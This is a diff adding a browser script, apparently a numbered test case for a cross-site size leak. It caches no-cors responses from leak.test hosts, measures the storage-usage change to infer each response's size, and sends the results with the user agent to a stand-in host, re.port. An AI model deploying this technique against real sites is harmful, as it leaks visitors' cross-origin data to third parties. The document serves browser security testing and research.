@@ -1,0 +1,38 @@
+<script>
+    var results = {};
+
+    function run(url, cb) {
+        navigator.storage.estimate().then(function (data1) {
+            fetch(url, {"mode": "no-cors"}).then(function(response) {
+                var usage = data1.usage;
+                console.log("Usage before: " + usage);
+                caches.open('v1').then(function(cache) {
+                    cache.put(url, response);
+                    setTimeout(function () {
+                        navigator.storage.estimate().then(function (data2) {
+                            results[url] = data2.usage - usage;
+                            console.log("Usage after: " + data2.usage);
+                            cb();
+                        });
+                    }, 1000);
+                });
+            });
+        });
+    }
+
+    function report() {
+        var xhr = new XMLHttpRequest();
+        xhr.open("GET", "https://re.port/case25.json/" + btoa(JSON.stringify({
+            "user-agent": navigator.userAgent,
+            "page": results["https://leak.test/"],
+            "image": results["https://sub.leak.test/resource1/"]
+        })));
+        xhr.send();
+    }
+
+    run("https://leak.test/", function () {
+        run("https://sub.leak.test/resource1/", function() {
+            setTimeout(report, 2000);
+        });
+    });
+</script>
